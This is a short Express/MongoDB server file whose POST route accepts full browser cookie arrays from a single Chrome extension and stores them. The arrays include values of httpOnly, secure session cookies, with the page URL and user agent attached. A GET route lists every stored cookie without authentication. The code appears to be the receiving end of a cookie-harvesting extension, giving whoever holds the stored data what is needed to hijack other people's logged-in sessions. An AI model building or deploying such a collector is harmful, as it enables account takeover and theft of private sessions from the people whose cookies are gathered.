import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import Cookie from './cookie.js';
import connectDB from './database.js';

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(cors({
  origin: ["chrome-extension://ajgljojgkknncdbcihhghdlaeifbdhba"]
}));


connectDB()
.then(() => console.log('MongoDB connected'))
.catch(err => console.error(err));

// Route to receive cookies array
app.post('/cookies', async (req, res) => {
  try {
    const { url, ua, cookies } = req.body;
    if (!cookies || !Array.isArray(cookies)) {
      return res.status(400).json({ error: 'Cookies array is required' });
    }

    const cookieDocs = cookies.map(cookie => ({
      url,
      ua,
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      expirationDate: cookie.expirationDate,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      sameSite: cookie.sameSite
    }));

    await Cookie.insertMany(cookieDocs);

    res.status(201).json({ message: 'Cookies saved', count: cookieDocs.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Route to list all cookies
app.get('/cookies', async (req, res) => {
  try {
    const cookies = await Cookie.find().sort({ createdAt: -1 });
    res.json(cookies);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
